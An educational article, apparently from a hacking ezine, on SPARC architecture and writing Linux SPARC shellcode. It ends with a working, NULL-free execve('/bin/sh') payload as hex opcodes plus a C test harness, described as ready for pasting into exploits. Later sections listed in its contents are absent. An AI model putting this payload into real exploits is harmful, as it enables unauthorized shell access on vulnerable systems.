# Linux SPARC Shellcodes

> "The number of UNIX installations has grown to 10, with more expected."

(The *UNIX Programmer's Manual*, 2nd Edition, June, 1972)

## TOC

1. [Bibliography](#1-bibliography)
2. [License](#2-original-license-text-now-gpl-v3)
3. [Gratitude](#3-gratitude)
4. [Motivation](#4-motivation)
5. [Architecture](#5-architecture)
    1. [5.1. RISC](#51-risc)
    2. [5.2. Load/Store](#52-loadstore)
    3. [5.3. Pipelining](#53-pipelining)
    4. [5.4. Endianness: the NUXI problem](#54-endianness-the-nuxi-problem)
    5. [5.5. Traps](#55-traps)
6. [Shellcodes](#6-shellcodes)
    1. [Basic Exec shellcode](#61-basic-exec-shellcode)
    2. [Bind shellcode](#bind-shellcode)
        1. [SPARC Stack](#sparc-stack)
        2. [Optimization](#optimization)
    3. Client shellcode (connect-back)
    4. Obfuscated shellcode (polymorphic)
7. End words

## 1. Bibliography

I consider important to expose as a first point the bibliography used as support to write this document, so the reader can quickly check the links provided or can purchase the referenced books. In this way, it will also help the reader to know what she will find in this text.

- SPARC Architecture, Assembly Language Programming, and C, 2nd Ed.
    - Richard P. Paul 1994, 2000 -Prentice Hall
    - ISBN 0-13-025596-3

- The SPARC Architecture Manual, version 9
    - David L. Weaver / Tom Germond, 1994 -Prentice Hall
    - ISBN 0-13-099227-5

- SPARC Assembly Language Reference Manual
    - http://www.cs.umu.se/kurser/5DV074/HT07/mom2/816-1681.pdf

- Intel 64 and IA-32 Intel Architecture Software Developer's Manual, Vol 1
    - Intel, 1997-2002 -Intel
    - Not a joke, it's quite handy

- System V Application Binary Interface, SPARC Processor Suplement, 3rd Ed
    - http://www.sparc.org/standards/psABI3rd.pdf

- Phrack

- NetSearch

## 2. (original) License text (now GPL v3)

*"THE BEER-WARE LICENSE" (Revision 42):
Javier Barrio wrote this file. As long as you retain this notice you can do whatever you want with this stuff. If we meet some day, and you think this stuff is worth it, you can buy me a beer in return.*

## 3. Motivation

There are many documents explaining the creation of shellcodes. At Phrack they don't even accept any more articles on this matter. However, it is the right time to help relaunch the (NetSearch) ezine with a text that covers a gap, the shellcodes in Linux SPARC in Spanish (original version), as well as deepen the knowledge of the CPU -mainly v9- and understand its assembler.

## 4. Gratitude

+ Sic transit gloria mundi, rwlock_t.
+ To my 48bits fellows and friends, for publishing this article.
+ To Twiz from Phrack.
+ To pancake (radare) for forcing me to add extra NOPs.
+ To Logan for not saying anything during work hours when watching me playing with ASM.
+ To Overdrive and Zosen, for special reasons.
+ On the top of the world: QSR.
+ To Richard W. Stevens, Jon B. Postel, Ken Thompson, Brian W. Kernighan, Dennis Ritchie and Mel because they are the real computer magicians.
+ To all usual suspects. They know who they are.

## 5. Architecture

The SPARC architecture -Scalable Processor ARChitecture- is a CPU that was designed originally by SUN Microsystems in 1985. It was based on the first RISC designs from both IBM and Berkeley from the beginning of the eighties, emphasizing a minimalistic instruction set -opcodes- with the ability of being executed at high speeds.

It is a trully open non-proprietary architecture which comercial brand was established in 1989 when the SPARC International Inc. organisation was created, when they gave licenses to build the chips to companies like Fujitsu, Texas or, of course, SUN.

### 5.1. RISC

Reduced Instruction Set Computers design dates back more than 25 years in time, with three main characteristics: ability to address 32 bits, execution of one instruction per cycle and system load / restore.

Over the time it has been proven as an ideal design to execute parallel instructions, create more efficient compilers (due, for example, to the concept of Delay Slot that we will see below) or to use "aligned" addressing. Also the use of few instructions to perform the same operations that a CISC CPU performed using a single instruction was observed faster.

The SPARC architecture addressed 32 bits in its 7th and 8th versions, jumping into 64 bits in 1993 when the version 9 was introduced. This is the CPU that is covered in this article. The 9th version of SPARC was designed to be competitive during a long period of time, and it has been proven as robust and effective for more than 15 years, something worth to mention in a field of constant progress like the microprocessor researching.

Some of the improvements that were included in the 9th version of SPARC over the 8th were:

- 64 bit addresses
- Superscalar implementation
- Small and simple instruction set
- Context switching and hyper-fast traps
- Big and little-endian support

Also important to mention its total backwards compatibility with its predecessor version.

### 5.2. Load/Store

It is common to say that SPARC is a 'Load/Store' architecture. This means that when you need to work with a datum that is residing in memory, it has to be temporary stored 'somewhere else' before it can be used by the CPU to perform the needed operations. And which is this place? A register. Or to be more precise, a register file.

A register file is like an integrated circuit which is used as a special RAM, storing data or addresses readed from memory. This lazy ASCII illustration tries to give an idea of the concept:

        ---------------------              --------------
        |                   |              |------------| M
      C |                   |              |------------| E
        |       -------     |   -------->  |------------| M
        |  -->  | alu | --- |              |------------| O
      P |  |    -------   | |              |------------| R
        |  |              | |   <--------  |------------| Y
        |  |  ----------  | |              |------------|
      U |  |  |register|<_| |              --------------
        |  |__|  file  |    |
        |     ----------    |
        |                   |
        ---------------------

This is an incomplete schema, but I hope it can help to illustrate how a Load/Store architecture works. Not to be confused with the memory stack -in which the data is stored- used, for instance, when calling a subroutine using the 'call' instruction (like a calculator). In a RISC machine data or memory addresses go from memory to the registers and on them is where the ALU, FPU or other units operate. In a Load/Store design, the CPU performs a `load` from a register or a `store` in a register, and this is part of the file register.

### 5.3. Pipelining

Pipelining may look like not directly related to the current topic, but I believe it can be interesting to speak about it here because of how it can influenciate the i-cache in the execution of instructions, as we will see in section 6.4.

The cycle described by Neumann, in the case of a RISC architecture, is comprised by four steps:

- instruction fetch
- execute
- memory access
- store result

By having four isolated and apparently independent components, when an instruction is decoded and jumps to the next stage in the pipeline, another instruction can be fetched and decoded without needing to wait before the first one has been executed. The most basic example that normally is used gives a clear idea about the advantages of using pipelines, as the speed increases *a lot:*

In an execution **without** pipeline, we would get the result of executing two instructions after 8 clock cycles, while in the case of a 'pipelined' design we would execute 4 instructions within the same time:

          --------------------------------
          |F | E | M | W | F | E | M | W |
          --------------------------------
        execution without pipeline: 2 instructions, 8 clock cycles

          ----------------
          |F | E | M | W |
          --------------------
             | F | E | M | W |
             --------------------
                 | F | E | M | W |
                 ---------------------
                     | F | E | M | W |
                     -----------------
        execution without pipeline: 4 instructions, 7 clock cycles

This design favors, as it can be observed in the above figure, the execution of instructions in parallel and, thus, the performance impact is bigger, but it comes with two caveats: the first one is the load of instructions and the second one is the concept known as 'branching', which will be covered in the next paragraphs.

Keeping in mind previous schema, if the processor is given the following instructions:

```
ld  [%o0], %o1
sub %o1, %o2, %o3
```

When it does the ``load`` and gets the datum from memory, it would be performing the substraction **at the same time** and thus, being a parallel execution, the datum loaded could not be the expected one. The processor can detect this and wait a clock cycle before getting the right value, but then it will be wasting resources. This is where the compiler optimization comes in place, as it was mentioned before, putting in its hands the decision of inserting between these two instructions a third one that doesn't affect the the substraction and allows to not waste the CPU cycle. This is known as 'load delay slot'.

The second issue, known as the 'branching delay slot', occurs when an instruction modifies the programme flux. For instance, a ``call`` instruction to execute a subroutine *is* a branching delay slot. What happens in this case is that the processor is not capable of waiting a cycle by itself and executes the next instruction. This, like in the previous case, instead of being a problem, can be used as an advantage to optimize code to its maximum, but as usual this is also in the hands of the programmer and, as nowadays assembler is not a widely used language, it is a task carried almost exclusively by the compiler. Nevertheless, maybe the reader understands know why we can find lots of NOP instructions in lots of codes *just after a* ``call``, emulating how the CPU behaves in the case of the load delay slot. Maybe in lieu of a NOP we could assign a value to an output register that will be used by the callee function and thus, not wasting the cycle.

### 5.4. Endianness: the NUXI problem

Before it has been shown that one of the features of a RISC architecture is that they are big-endian and that, more specificically, SPARCv9 is big-endian, with the particularity that it is able to read data in little-endian. It is possible to even mix kernel-land in big-endian + userland in little and vice versa.

When UNIX was initially ported to other computers different than the PDP-11, like for instance the mini computer from IBM Series/1, and this port was booted into the Operating System, they observed an anomaly: instead of writing the word UNIX to the screen, the readed word was NUXI. That is, the byte were stored in a reverse way: in an architecture the byte for the 'U' letter from couple 'UN' was stored first as being the most significant one while in the other it happened the contrary; it was the LSB -less significant byte- the one stored first.

It seems that the first person to observe this behavior was a passionate Gulliver reader and gave to this phenomenon 'big-endian' and 'little-endian' to the MSB and LSB respective solutions in a direct allusion to how the liliputians called the parts of an egg.

The following code illustrates this problem:

```
% uname -sm
Linux sparc64
```
```
% cat endian.c
#include <stdio.h>

int main() {
  long int i = 15;
  const char *p = (const char *) &i;
  if (p[0] == 5) {
    printf ("Little Endian\n");
  } else {
      printf ("Big Endian\n");
    }
  return (0);
}
%
```

It the above code is compiled and executed in a big-endian design, as the first byte is considered to be more important, it will display the 'Big Endian' message while if executed in a CISC (little-endian) it will show the other message.

```
% uname -sm ; (gcc endian.c -oendian && ./endian)
Linux sparc64
Big Endian
%
```

```
% uname -sm; (gcc endian.c -oendian && ./endian)
Linux i686
Little Endian
%
```

Maybe the reader can think this can represent an issue when it comes to locate data in memory, for instance the address of */bin/sh*, but it is not, as the System knows that it is being executed in a CPU big or little endian and does it transparently. So it seems that a multi architecture shellcode is not possible, but in Phrack magazine they developed ASS...

But there is a case where the byte order can be an issue, and this situation is when interchanging data via networking, and that's the reason of existince of the functions ``htons()`` and ``stohs()``, so data can be sorted upon reception. Note than in a RISC computed ``htons()`` can be ignored because in networking, data travels big-endian.

### 5.5. Traps

Using the previous code example to check in which order the microprocessor stores the data, we can oberve the call to the function ``printf()``. If we digg deeper, we find that such function is a wrapper and that in the end, who writes in the screen is the Linux kernel, and that it does that by the use of a system call, ``write()``. As the reader may already know, in order to execute a syscall, we need to change the execution mode. In SPARC there are two execution modes: supervisor and user (think of ring0/ring3 in IA-32), being the former 'kernel territory' while the latter is the one where all programms we execute do reside.

SPARC microprocessors use traps as a unified mechanism to handle both syscalls and exceptions but also interruptions. A trap in SPARC is a *procedure call* which is invoked both in synchronous and asynchronous exceptions as well as traps initiated by software and for device-generated interruptions.

In SPARC, to perform a *context switch* and change from user mode to supervisor mode, we use a trap. Maybe the reader knows how this works in the IA-32 architecture, in which to change from ring3 to ring0, the system executes the ``int`` instruction, which generates a software interrupt, specificically ``int 0x80``. The concept works almost identically in Linux sparc64, but obviously both the registers and the instructions do change. The necessary assembler to execute a call to ``sys_write()`` that will print the digit '1' on the screen in IA-32 would be this:

```
    mov $0x0, %ebx
    mov $dir, %ecx
    mov $0x1, %edx
    mov $0x4, %eax
    int 0x80
```

And its equivalent in Linux sparc64 would be:

```
    mov 0,    %o0
    mov $dir, %o1
    mov 1,    %o2
    mov 4,    %g1
    ta       0x90
```

The instruction ``ta`` -trap always- handles the change to supervisor mode unconditionally, but there exist other condtional traps such as ``te`` -trap equal- or ``tn`` -trap never-. The return value from the syscall will be stored in the %o0 register.

## 6. Shellcodes

As per [Wikipedia](https://en.wikipedia.org/wiki/Shellcode), a shellcode is a piece of machine code embedded as the payload of an exploit to get a shell. This is a reasonable definition but I believe it to be incomplete.

In the next example we show an example of C code, valid on all POSIX systems, which executes a call to the standard glibc function ``printf()`` to generate from it an assembler code for sparc64 that will perform the same function:

```
% cat printf.c
int main()
{
  printf ("printf() invoked\n");
  return (0);
}
%
```

If we perform an ``strace`` on the ELF executable generated by GCC, we will observe that the function ``printf()`` is converted, in the end, into a system call to execute ``write()``:

```
    % gcc printf.c -o printf
    % strace -olog ./printf && grep invoked log
    printf() invoked
    write(1, "printf() invoked\n", 17)      = 17
    %
```

This means that if what we want is to write the equivalent to this C code in assembler, we will perform a call to ``printf()``, but we can bypass this step executing a syscall ``write()`` with the arguments prefilled and it will also work:

```
    % cat write.s
    .global _start

    _start:

      mov 1, %o0
      set string, %o1
      mov 0x11, %o2
      mov 4, %g1
      ta 0x90
      mov 0, %o0
      mov 1, %g1
      ta 0x90

    string:
      .asciz  "write() invoked!\n"
```

```
    % as write.s -o write.o && ld write.o -owrite && ./write
    write() invoked!
    %
```

This instruction, ``ta 0x90`` invokes a trap using the 0x90 value, which in Linux sparc64 means 'change to supervisor mode and execute the syscall indicated in the register %g1'. There are other architectures in which the arguments to a syscall are passed through the stack, but in SPARC this does not differ from IA-32 and arguments are passed through the output registers %oX -unless there are more than five arguments and then a pointer to the stack is required, but this has been already covered in tons of documents-.

As we were saying, the 0x90 valeu indicates sycall in Liux sparc64, and it is defined in the file /usr/include/asm-sparc/traps.h:

```
#define SP_TRAP_SOLARIS 0x88         /* Solaris System Call */
#define SP_TRAP_NETBSD  0x89         /* NetBSD System Call */
#define SP_TRAP_LINUX   0x90         /* Linux System Call */
```

If we compile the Linux kernel with support to emulate Solaris binaries, we can use the instruction ``ta 0x88`` as another door to invoke syscalls, but if we don't have this support enabled and we execute this trap, we will get a message in the logs similar to this one:


```
    For Solaris binary emulation you need solaris module loaded
```

So keeping this ``#define`` in mind, let's now check something curious: using as a base the assembler code to execute the ``write()``, let's try to strace it:

```
    % strace ./write
    execve("./write", ["./write"], [/* 35 vars */]) = 0
    syscall: unknown syscall trap 91d02090 000100a8
    %
```

Something happened and strace has not been able to guess which trap has been executed. In some shellcodes we can find the instruction ``ta 0x8`` for Solaris or ``ta 0x10`` for Linux. If we replace our 0x90 by 0x10 and we execute strace again, the result will be the expected one:

```
    % strace ./write
    execve("./write", ["./write"], [/* 35 vars */]) = 0
    write(1, "write() invoked!\n", 17write() invoked!
    )      = 17
    exit(0)                                 = ?
    Process 3699 detached
    %
```

This explanation for this phenomenon is this: Solaris uses the known 'hardware' and 'software' traps. The software traps are the ones that can be used with tcc instructions (cc = condition code). Every time that a tcc is executed, the value passed is *added* to the initial relative value of the software traps table. This way, in UltraSPARC we see as reserved the first 256 entries (0x100), so an instruction like ``ta 0x10`` will transfer the actual control to the entry 0x110, which, according to the file ``arch/sparc64/kernel/ttable.S``:

```
       sparc64_ttable_tl0:
       tl0_resv000:    BOOT_KERNEL BTRAP(0x1) BTRAP(0x2) BTRAP(0x3)
       tl0_resv004:    BTRAP(0x4)  BTRAP(0x5) BTRAP(0x6) BTRAP(0x7)
       [...]
       tl0_resv10a:    BTRAP(0x10a) BTRAP(0x10b) BTRAP(0x10c) BTRAP(0x10d)
       BTRAP(0x10e)
       tl0_resv10f:    BTRAP(0x10f)
       tl0_linux32:    LINUX_32BIT_SYSCALL_TRAP
       tl0_oldlinux64: LINUX_64BIT_SYSCALL_TRAP [...]
```

As we can see, it is LINUX_32BIT_SYSCALL_TRAP, so we can guess that '0x10' is the right value to pass to the trap instruction to always execute a syscall from TL=0.

So what happens, then, with ``ta 0x90``? Every value starting at 0x980 in sun4v is dedicated to hypervisor hyper-fast traps and fast traps (the ones that have the value encoded in the instruction). 0x80 is a ``#define HV_FAST_TRAP`` that can be located in the file include/asm-sparc64/hypervisor.h and that is used to speed the context switching process. This may be similar to ``sysenter`` in IA-32. It seems that for some reason strace doesn't know how to interpret correctly this 0x90 while the OS/compiler do understand well that this 0x90 is  ``0x80 & 0x10`` while an strace maybe is trying to translate it into ``0x80 & 0x90`` and cannot interpret that.

Having in mind all the above, we can finally present a shellcode. Let's do it first in C and then we will translate into sparc64 asm:

```
% cat exec.c
#include <stdio.h>
int main() {
  execve("/bin/sh", NULL, NULL);
}
%
```

If you compile and execute this, you will get a beautiful shell. If we disassemble it with GDB, we will almost all the necessary code to programme the shellcode in sparc asm:

```
(gdb) disas main
Dump of assembler code for function main:
0x00010424 <main+0>:    save  %sp, -104, %sp
0x00010428 <main+4>:    sethi  %hi(0x10400), %g1
0x0001042c <main+8>:    or  %g1, 0x1b8, %o0     ! 0x105b8
0x00010430 <main+12>:   clr  %o1
0x00010434 <main+16>:   clr  %o2
0x00010438 <main+20>:   call  0x2071c <execve@plt>
0x0001043c <main+24>:   nop
0x00010440 <main+28>:   mov  %g1, %i0
0x00010444 <main+32>:   ret
0x00010448 <main+36>:   restore
End of assembler dump.
(gdb)
```

We can see both the prolog procedure for sparc as well as the values being assigned to the registers (the address of the string '/bin/sh' and two NULLs) and also the call to ``execve()``. This last piece is what we are still missing to finish coding a basic shell.s, but we can infer it easily if we compile the shown code with the flag -static, in which case we will get the below code:

```
(gdb) disas execve
Dump of assembler code for function execve:
0x000191a0 <execve+0>:  save  %sp, -112, %sp
0x000191a4 <execve+4>:  mov  %i0, %o0
0x000191a8 <execve+8>:  mov  %i1, %o1
0x000191ac <execve+12>: mov  %i2, %o2
0x000191b0 <execve+16>: mov  0x3b, %g1
0x000191b4 <execve+20>: ta  0x10
0x000191b8 <execve+24>: bcs  0x191c8
0x000191bc <execve+28>: nop
0x000191c0 <execve+32>: ret
0x000191c4 <execve+36>: restore  %g0, %o0, %o0
End of assembler dump.
(gdb)
```

From this function we can deduct some stuff: firstly, that Linux uses 0x10 as the value to execute tcc's. Secondly, that the syscall execve number is 59 (/usr/include/asm-sparc64/unistd.h) and the third one and more important: we already got all the necessary to build our first assembler shellcode in sparc64.


### 6.1. Basic Exec Shellcode

As we saw in the previous section, we don't need many ingredients to code a mini shellcode in asm for sparc64. Let's do one and test it:

```
    % cat shellcode.S
    .global _start

    _start:

      save    %sp, -96, %sp
      set     string, %o0
      mov     0xb, %g1
      ta      0x90
      mov     1, %g1
      ta      0x90

    string:
    .ascii  "/bin/sh"
```

```
    % as shellcode.S -o shellcode.o
    % ld shellcode.o -o shellcode
    % echo $$
    5913
    % ./shellcode
    % echo $$
    26257
    % exit
    % echo $$
    5913
```

It worked. We have just executed a shell. However, as it is already explained in a lot of papers, to execute a code, whatever it is, *from inside* another program, we will need to inject the necessary opcodes and not the assembler code. The reason for that is obvious: the process is already being executed and what CPU is waiting for are things she can understand, and that are opcodes. We could generate them via old school method, that is, by hand, but it is quite tedious to copy paste every single ``x/bx`` from GDB, so normally I tend to use this small program:

```
    int main (int argc, char *argv[])
    {
      unsigned char ch;
      int a = 1;
      printf ("char sc[] = \n\"");
      while (1) {
        if (read (0, &ch, 1) != 1) break;
        printf ("\\x%02x", ch);
        if (!(a++ % 10)) printf ("\"\n\"");
      }
      printf ("\";\n");
    }
```

This code only needs a valid argument from which generate opcodes. How do we pass a valid argument? Generating a binary object. And how do we generate it? Let's see how:

```
    % gcc opcode_generator.c -o opcode_generator   # opcode_generator.c contains the above code
    % as scode.s -o scode.o  # the shellcode
    % file scode.o
    scode.o: ELF 32-bit MSB relocatable, SPARC, version 1 (SYSV), not stripped
    % objcopy -O binary -j .text scode.o scode.bin
    % ./opcode_generator < scode.bin
    char sc[] =
    "\x9d\xe3\xbf\xa0\x11\x00\x00\x00\x90\x12"
    "\x20\x00\x82\x10\x20\x0b\x91\xd0\x20\x90"
    "\x82\x10\x20\x01\x91\xd0\x20\x90\x2f\x62"
    "\x69\x6e\x2f\x73\x68";
```

Et voilà, we got the opcodes ready to be copied and pasted in your favourite exploit. So if we have it, let's execute it in a .c file to test it, right?

```
    char sc[] =
    "\x9d\xe3\xbf\xa0\x11\x00\x00\x00\x90\x12"
    "\x20\x00\x82\x10\x20\x0b\x91\xd0\x20\x90"
    "\x82\x10\x20\x01\x91\xd0\x20\x90\x2f\x62"
    "\x69\x6e\x2f\x73\x68";

    int main() {
      int (*scode)();
      scode = (int (*)()) sc;
      (int)(*scode)();
      return (0);
    }
```

We compile and execute:

```
    % echo $$
    9529
    % ./a
    % echo $$
    9529
```

Something happened and the shellcode has not been executed. Well, to be precise, more than one thing happened, but the most important and remarkable ones are two: the shellcode is not 'self-contained' and it has NULLs in it. Let's forget about the NULLs for a moment and focus on the self-contained concept, which is the real reason behing the machine code not being executed.

If the reader is familiarized with the ELF file specification, she will have already been able to check that every ELF executable has many sections (.data, .text, .bss, etc), and in every of these sections there are stored specific parts of our program. For instance, the map containing shared library addresses is stored in the .got section, and is for this reason that there are specific papers talking about how to modify such a section and point the program to where we want. Other example could be the famous paper in which they take advantage of how the old compiled GCC to overwrite .dtors. Keeping this in mind, we need to engineer a system to get in the same section than the rest of the code the string to the shell we are willing to execute.

In IA-32 this is typically done with the classic ``jmp + call/pop`` to place in the stack the address of the string and make it possible to jump into it, but in SPARC this cannot be done directly due to the already explained Delay Slot: if we execute a call, the CPU will already process as well the next instruction. This is what we explained before. In some papers, the authors use the ``bn`` instruction -branch never-, which forces the CPU to not jump to the address used as argument to then store somewhere the value of %o7 and the needed offset, but even being this case the most optimized one in terms of resource usage, I believe it is not as good when it comes to make a compact shellcode, which is always one of the main goals when writing shellcodes. For this reason, what we can do is to *emulate* the behavior of the output generated by GNU as: replace 'set' by its equivalent self-contained and not to define symbols. So let's go back to the above example code to search for the defined symbols and see how we can fix the problem of the string in memory:

```
 % as shellcode.S -als -o shellcode.o
SPARC GAS  shellcode.S                  page 1

   1                    .global _start
   2
   3                    _start:
   4
   5 0000 9DE3BFA0        save    %sp, -96, %sp
   6 0004 11000000        set     string, %o0
   6      90122000
   7 000c 8210200B        mov     0xb, %g1
   8 0010 91D02090        ta      0x90
   9 0014 82102001        mov     1, %g1
  10 0018 91D02090        ta      0x90
  11
  12                    string:
  13 001c 2F62696E      .ascii  "/bin/sh"
  13      2F7368
SPARC GAS  shellcode.S                  page 2


DEFINED SYMBOLS
         shellcode.S:3      .text:0000000000000000 _start
         shellcode.S:12     .text:000000000000001c string

NO UNDEFINED SYMBOLS
%
```

The ``set string`` that we see in the 6th line of the code, which symbol we get referenced at the end of the output, is the equivalent of /bin/sh, represented in hexadecimal as 0x2f62696e2f7368. Here we get out first obstacle, because given the fact the SPARC is an architecture in which all the instructions are aligned to 4 bytes as we mentioned at the beginning when talking about RISC, we need to segment the load of the string in memory in two steps: 4 bytes for the string '/bin' and 4 more for '/sh\0', because, as a reminder, we need this NULL to be able to execute the shell. The solution for this is to 'load' in the local registers the address of the shell via the instruction ``sethi``, which comes from executing ``set`` on the most significant bits -remember, big-endian here- of the register. This instruction needs two arguments: a constant of 22 bits in size and a destination register. The result of executing ``sethi`` will be that it will set the 22 MSB bits to the constant we pass to and it will also make a clear of the other 10 bits. This is done like this because of the nature of the instruction, because when encoding it needs two bits for 00, 5 bits for the destination register, 3 for the value 100 and 22 for the constant. 2 + 5 + 3 + 22 = 32. Let's see how to write '/bin/sh' on the screen using ``sethi``:

```
    % cat binsh.s
    .align 4
    .global _start

    _start:

    mov 1, %o0
    sethi   %hi(0x2F62696E), %l0
    sethi   %hi(0x2F736800), %l1
    and     %sp, %sp, %o1
    mov 8, %o2
    mov 4, %g1
    ta 0x10
    mov 0, %o0
    mov 1, %g1
    ta 0x10
```

```
    % as binsh.s -o binsh.o && ld binsh.o -o binsh
    % strace ./binsh
    execve("./binsh", ["./binsh"], [/* 36 vars */]) = 0
    write(1, "/bh\0/sh\0", 8/bh/sh)               = 8
    exit(0)                                 = ?
    Process 15606 detached
    %
```

Let's examine this to explain a couple of things: the first one is, why is that we have used local registers to this stack frame if the arguments to syscalls are passed in the output registers? We have done that because is one of the ways we have to store the memory address of the string in %o1 by the logic AND over the %sp. Hip hop hurray for SPARC, which accepts operations with three registers. The second thing to explain is that, what we really store in %o1 is the *address **of the address*** of the string, which means, we are pointing %o1 to %l0, which is where the string begins. In any case, something curious happened: some NULLs arise stored by the sethi instruction in the 10 LSB of the registers but also we got an 'h' in the place of the 'i' because the clear performed by sethi has reached some of its bits.

To fix the clear done by sethi we can use the logic instruction 'or' as we would do in any other platform or language. If we perform an 'or' on a zero with another value, this other value will prevail. If both values are equal, it will remain unchanged and this is exactly what we are looking for. Let's try it adding the needed OR's:

```
    % grep -B1 or binsh2.s
    sethi   %hi(0x2F62696E), %l0
    or      %l0, %lo(0x2F62696E), %l0
    sethi   %hi(0x2F736800), %l1
    or      %l1, %lo(0x2F736800), %l1
    % as binsh2.s -o binsh2.o && ld binsh2.o -o binsh2
    % strace ./binsh2
    execve("./binsh2", ["./binsh2"], [/* 36 vars */]) = 0
    write(1, "/bin/sh\0", 8/bin/sh)                = 8
    exit(0)                                 = ?
    Process 32182 detached
    %
```

It worked like a charm. We have reached our goal. Let's remove that write and replace it by an ``execve()``:

```
    .global _start

    _start:

    sethi   %hi(0x2F62696E), %l0
    or      %l0, %lo(0x2F62696E), %l0
    sethi   %hi(0x2F736800), %l1
    or      %l1, %lo(0x2F736800), %l1
    and     %sp, %sp, %o0
    mov     0xb, %g1
    ta      0x10
    mov     1, %g1
    xor     %o1, %o1, %o0
    ta      0x10
```

This working code generated the below hex representation:

```
  char sc[] =
  "\x21\x0b\xd8\x9a\xa0\x14\x21\x6e\x23\x0b"
  "\xdc\xda\xa2\x14\x60\x00\x90\x0b\x80\x0e"
  "\x82\x10\x20\x0b\x91\xd0\x20\x10\x82\x10"
  "\x20\x01\x90\x1a\x40\x09\x91\xd0\x20\x10";
```

All good but for one thing... there is a NULL. Which instruction is generating this NULL? We can check it with GNU as or we can sense it already. Let's think: if before adding the OR's we did add by hand a NULL to the end of the /bin/sh\0 string... is this the NULL that we are getting now? Yes, it is:

```
    7 0008 230BDCDA         sethi %hi(0x2F736800), %l1
    8 000c A2146000         or %l1, %lo(0x2F736800), %l1
```

Here we have it. At this point, we ask ourselves how to remove it. We could perform an XOR over the low bits of %l1, but the reality is that we don't need that because ``sethi`` *already* does this work for us when it sets to 0 the last 10 bits of the register. So if we remove the second 'or' we still have a working shellcode and we have eliminated an instruction, saving 4 bytes:

```
    % cat sc.c
    char sc[] =
    "\x21\x0b\xd8\x9a\xa0\x14\x21\x6e\x23\x0b"
    "\xdc\xda\x90\x0b\x80\x0e\x82\x10\x20\x0b"
    "\x91\xd0\x20\x10\x82\x10\x20\x01\x90\x1a"
    "\x40\x09\x91\xd0\x20\x10";

    int main() {
      int (*scode)();
      scode = (int (*)()) sc;
      (*scode)();
    }
    % gcc sc.c -o sc
    % echo $$
    9529
    % ./sc
    % echo $$
    11256
    % exit
    %
```

We finally succeeded: we have a valid shellcode working for Linux SPARC (and that *would* work on Solaris if we replace the trap code by 0x8) and without NULLs. But as normally is emphasized in lots of similar documents, a shellcode as the above will only work in situations where the escalation of privileges is executed locally, via physical access to the server or using a pre-existing network connection (like SSH).
